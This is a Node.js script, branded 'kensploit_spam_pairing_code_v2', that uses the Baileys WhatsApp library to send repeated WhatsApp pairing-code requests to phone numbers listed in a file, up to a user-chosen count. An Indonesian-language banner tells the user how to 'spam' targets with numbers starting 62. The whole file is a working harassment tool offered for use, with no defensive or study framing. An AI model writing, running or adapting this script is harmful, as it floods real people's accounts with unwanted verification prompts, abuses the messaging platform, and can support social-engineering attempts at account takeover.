const { default: makeWASocket, useMultiFileAuthState } = require("@whiskeysockets/baileys");
const pino = require('pino');
const readline = require("readline");
const fs = require('fs'); 

const color = [
    '\x1b[31m', 
    '\x1b[32m', 
    '\x1b[33m', 
    '\x1b[34m', 
    '\x1b[35m', 
    '\x1b[36m', 
    '\x1b[37m',
    '\x1b[90m' 
];
const kensploitColor = color[Math.floor(Math.random() * color.length)];

const xColor = '\x1b[0m';

const question = (text) => {
    const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
    return new Promise((resolve) => { rl.question(text, resolve) });
};

async function Kensploit() {
    const { state } = await useMultiFileAuthState('./kensploit/session');
    const KensploitPairing = makeWASocket({
        logger: pino({ level: "silent" }),
        printQRInTerminal: false,
        auth: state,
        connectTimeoutMs: 60000,
        defaultQueryTimeoutMs: 0,
        keepAliveIntervalMs: 10000,
        emitOwnEvents: true,
        fireInitQueries: true,
        generateHighQualityLinkPreview: true,
        syncFullHistory: true,
        markOnlineOnConnect: true,
        browser: ["Ubuntu", "Chrome", "20.0.04"],
    });

    try {
        
        const phoneNumbers = fs.readFileSync('no.txt', 'utf-8').split('\n').map(num => num.trim()).filter(num => num);
        
        if (phoneNumbers.length === 0) {
            console.log('No targets found in no.txt');
            return;
        }

        
        const kensploitc = parseInt(await question(kensploitColor + 'Jumlah : ' + xColor));

        if (isNaN(kensploitc) || kensploitc <= 0) {
            console.log('Please enter a valid number greater than 0.');
            return;
        }

        
        for (let i = 0; i < kensploitc; i++) {
            const targetIndex = i % phoneNumbers.length; 
            const phoneNumber = phoneNumbers[targetIndex];

            try {
                let code = await KensploitPairing.requestPairingCode(phoneNumber);
                code = code?.match(/.{1,4}/g)?.join("-") || code;
                console.log(kensploitColor + `Succes Spam Pairing Code - Number : ${phoneNumber} from : [${i + 1}/${kensploitc}]` + xColor);
            } catch (error) {
                console.error('Error:', error.message);
            }
        }
    } catch (error) {
        console.error('Error:', error.message);
    }

    return KensploitPairing;
}

console.log(kensploitColor + `Menjalankan... kensploitpcv2
==============================================
┃ • kensploit_spam_pairing_code_v2	     ┃
┃ • by Kensploit			     ┃
┃ • jangan di jual ya sayang		     ┃
==============================================
┃					     ┃
┃ [ FOLLOW THE INSTRUCTIONS BELOW, TO SPAM ] ┃
┃					     ┃
┃⭔ Target Spam ( 62xxxxxxx )		     ┃
┃⭔ Gunakan Angka ( 1-1000 )		     ┃
┃					     ┃
┃ [ Gunakan Dengan Awali Nomer 62xxxx ]	     ┃
┃					     ┃
==============================================` + xColor);

Kensploit();
